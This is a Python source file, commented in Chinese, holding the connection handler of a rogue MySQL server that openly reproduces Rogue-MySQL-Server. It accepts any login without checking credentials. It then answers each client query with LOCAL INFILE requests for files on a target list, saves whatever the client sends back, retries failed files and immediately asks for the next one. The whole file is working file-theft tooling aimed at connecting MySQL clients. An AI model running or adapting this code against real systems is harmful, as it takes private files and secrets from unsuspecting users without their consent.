"""MySQL 客户端会话处理器。

复刻 Rogue-MySQL-Server 的核心流程：
    服务端握手 -> 客户端认证 -> 客户端执行查询 ->
    服务端以 LOCAL INFILE 请求客户端本地文件 -> 接收并保存文件内容。

报文序号遵循 MySQL 协议规则：每个命令周期从 0 开始，服务端回复占用
下一个序号，文件数据报文 thereafter 连续递增。
"""

from __future__ import annotations

import asyncio

from exceptions import PacketOrderError, ProtocolError, TaskError
from file_manager import FileHandler, TaskManager, TaskStatus
from protocol import (
    COM_INIT_DB,
    COM_PING,
    COM_QUIT,
    COM_QUERY,
    MySQLPacket,
    build_eof,
    build_handshake,
    build_local_infile_request,
    build_ok,
)
from state_machine import OperationState, ProtocolState, SessionState, StateMachine

PHASE_HANDSHAKE = "HANDSHAKE"
PHASE_COMMAND = "COMMAND"
PHASE_FILE = "FILE"


class MySQLConnectionHandler:
    """处理单个客户端连接上的完整协议会话。"""

    def __init__(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
        logger,
        task_manager: TaskManager,
        file_handler: FileHandler,
        connection_id: int = 45,
    ):
        self.reader = reader
        self.writer = writer
        self.logger = logger
        self.task_manager = task_manager
        self.file_handler = file_handler
        self.connection_id = connection_id

        self.machine = StateMachine()
        self.phase = PHASE_HANDSHAKE
        self.expected_packet_num = 1
        self.current_task = None
        self.received_data = False
        self.bytes_received = 0
        self.peer = writer.get_extra_info("peername")

    async def handle(self) -> None:
        """会话主入口。"""
        self.logger.info("client connected: %s", self.peer)

        try:
            await self._send_handshake()
            await self._handle_auth()
            await self._command_loop()

        except (asyncio.IncompleteReadError, ConnectionResetError, BrokenPipeError):
            self.logger.info("client disconnected: %s", self.peer)

        except PacketOrderError as exc:
            self.logger.warning("packet order error from %s: %s", self.peer, exc)

        except (ProtocolError, TaskError) as exc:
            self.logger.warning("protocol error from %s: %s", self.peer, exc)

        except asyncio.CancelledError:
            raise

        except Exception:
            self.logger.exception("unexpected error while handling %s", self.peer)

        finally:
            await self._close()

    # ------------------------------------------------------------------
    # 协议阶段
    # ------------------------------------------------------------------

    async def _send_handshake(self) -> None:
        await self._send(build_handshake(self.connection_id, 0))
        self.machine.transition_session(SessionState.AUTH)
        self.phase = PHASE_HANDSHAKE
        self.expected_packet_num = 1

    async def _handle_auth(self) -> None:
        packet = await self._receive()
        self._verify_order(packet)

        # 不校验客户端凭据：握手响应的存在即表示客户端接受了服务端版本。
        await self._send(build_ok(packet.packet_num + 1))

        # 认证结束后，客户端的下一条命令序号重置为 0。
        self.expected_packet_num = 0
        self.phase = PHASE_COMMAND
        self.machine.transition_session(SessionState.READY)
        self.logger.debug("client authenticated: %s", self.peer)

    async def _command_loop(self) -> None:
        while not self.machine.is_closed:
            packet = await self._receive()
            self._verify_order(packet)

            if self.phase == PHASE_FILE and not self._is_new_command(packet):
                await self._handle_file_packet(packet)
                continue

            command = packet.payload[0] if packet.payload else None

            if command is None or command == COM_QUIT:
                break

            if command == COM_PING:
                await self._reply_ok(packet)

            elif command == COM_INIT_DB:
                await self._reply(packet, build_eof)

            elif command == COM_QUERY:
                await self._handle_query(packet)

            else:
                self.logger.debug(
                    "unsupported command 0x%02x from %s", command, self.peer
                )
                await self._reply_ok(packet)

    async def _handle_query(self, packet: MySQLPacket) -> None:
        """处理 COM_QUERY，向客户端发起 LOCAL INFILE 请求。"""
        task = self.current_task

        if task is not None and task.status == TaskStatus.PROCESSING:
            # 上一次请求后客户端没有回传文件内容，记一次失败。
            failed_filename = task.filename
            can_retry = self.task_manager.retry_task(failed_filename)
            self.current_task = None
            task = None

            if not can_retry:
                self.logger.info(
                    "task failed after %d attempts: %s",
                    self.task_manager.max_attempts,
                    failed_filename,
                )
                self.machine.transition_operation(OperationState.FAILED)
                self.machine.reset_operation()

        if task is None:
            task = self.task_manager.get_next_task()

        if task is None:
            self.logger.info("all tasks finished for %s", self.peer)
            await self._reply_ok(packet)
            return

        self.task_manager.start_task(task.filename)
        self.current_task = task
        self.received_data = False

        await self._send(
            build_local_infile_request(packet.packet_num + 1, task.filename)
        )
        self.expected_packet_num = (packet.packet_num + 2) & 0xFF
        self.phase = PHASE_FILE

        if self.machine.operation_state == OperationState.IDLE:
            self.machine.transition_operation(OperationState.PROCESSING)

        print("[+] Requesting {}".format(task.filename))
        self.logger.info("requesting file: %s", task.filename)

    async def _handle_file_packet(self, packet: MySQLPacket) -> None:
        """接收文件内容报文。空 payload 表示本次传输结束（成功或拒绝）。"""
        task = self.current_task

        if task is None:
            # 意外进入文件阶段，回到命令周期重新开始。
            self.phase = PHASE_COMMAND
            self.expected_packet_num = 0
            return

        if packet.payload:
            written = self.file_handler.write_chunk(task.filename, packet.payload)
            self.bytes_received += written
            self.received_data = True
            self.expected_packet_num = (packet.packet_num + 1) & 0xFF
            self.logger.debug(
                "received %d bytes for %s (packet %d)",
                written, task.filename, packet.packet_num,
            )
            return

        # ---- 空报文：本次传输结束 ----
        next_task = None

        if not self.received_data:
            # 客户端没有回传任何内容：与原版一致，记为一次失败。
            failed_filename = task.filename
            can_retry = self.task_manager.retry_task(failed_filename)
            self.current_task = None
            self.received_data = False

            if can_retry:
                # 重新请求同一个文件（retry_task 已将其状态设回 PENDING）。
                self.task_manager.start_task(failed_filename)
                self.current_task = self.task_manager.get_task(failed_filename)
                await self._send(
                    build_local_infile_request(
                        packet.packet_num + 1, failed_filename
                    )
                )
                self.expected_packet_num = (packet.packet_num + 2) & 0xFF
                print("[-] Retrying {}".format(failed_filename))
                self.logger.info("retrying file: %s", failed_filename)
                return

            # 达到重试上限，放弃该文件。
            self.machine.transition_operation(OperationState.FAILED)
            self.machine.reset_operation()
            print("[-] Moving on from {}".format(failed_filename))
            self.logger.info("gave up on file: %s", failed_filename)
            next_task = self.task_manager.get_next_task()

        else:
            # 收到过实际内容：任务成功。
            self.task_manager.complete_task(task.filename)
            self.machine.transition_operation(OperationState.COMPLETED)
            self.machine.reset_operation()
            self.current_task = None
            self.received_data = False

            total = self.file_handler.size(task.filename)
            print("[+] File {} obtained ({} bytes)".format(task.filename, total))
            self.logger.info("file obtained: %s (%d bytes)", task.filename, total)
            next_task = self.task_manager.get_next_task()

        if next_task is None:
            await self._send(build_ok(packet.packet_num + 1))
            # 命令周期结束：客户端下一条命令的序号重置为 0
            self.expected_packet_num = 0
            self.phase = PHASE_COMMAND
            self.logger.info("all requested files obtained from %s", self.peer)
            return

        # 与原始 RogueSQL 一致：不等新的查询，立刻请求下一个文件。
        self.task_manager.start_task(next_task.filename)
        self.current_task = next_task
        self.received_data = False
        await self._send(
            build_local_infile_request(packet.packet_num + 1, next_task.filename)
        )
        self.expected_packet_num = (packet.packet_num + 2) & 0xFF
        self.machine.transition_operation(OperationState.PROCESSING)

        print("[+] Requesting {}".format(next_task.filename))
        self.logger.info("requesting file: %s", next_task.filename)

    # ------------------------------------------------------------------
    # 收发与校验
    # ------------------------------------------------------------------

    @staticmethod
    def _is_new_command(packet: MySQLPacket) -> bool:
        """序号 0 的 COM_QUERY/COM_QUIT 表示新的命令周期（客户端拒绝文件后常见）。"""
        return (
            packet.packet_num == 0
            and bool(packet.payload)
            and packet.payload[0] in (COM_QUERY, COM_QUIT)
        )

    def _verify_order(self, packet: MySQLPacket) -> None:
        if self._is_new_command(packet):
            return

        if packet.packet_num != self.expected_packet_num:
            raise PacketOrderError(
                "expected packet {}, got {}".format(
                    self.expected_packet_num, packet.packet_num
                )
            )

    async def _receive(self) -> MySQLPacket:
        if self.machine.protocol_state is ProtocolState.LEN:
            self.machine.transition_protocol(ProtocolState.DATA)

        packet = await MySQLPacket.read_from(self.reader)

        self.machine.reset_protocol()
        self.logger.debug("recv %r", packet)
        return packet

    async def _send(self, packet: MySQLPacket) -> None:
        self.logger.debug("send %r", packet)
        self.writer.write(packet.to_bytes())
        await self.writer.drain()

    async def _reply(self, packet: MySQLPacket, builder) -> None:
        await self._send(builder(packet.packet_num + 1))
        # 普通命令完成后，下一条命令序号重新从 0 开始
        self.expected_packet_num = 0
        self.phase = PHASE_COMMAND

    async def _reply_ok(self, packet: MySQLPacket) -> None:
        await self._reply(packet, build_ok)

    async def _close(self) -> None:
        if not self.machine.is_closed:
            self.machine.close()

        if not self.writer.is_closing():
            self.writer.close()
            try:
                await self.writer.wait_closed()
            except (OSError, ConnectionError):
                pass

        self.logger.info("connection closed: %s", self.peer)
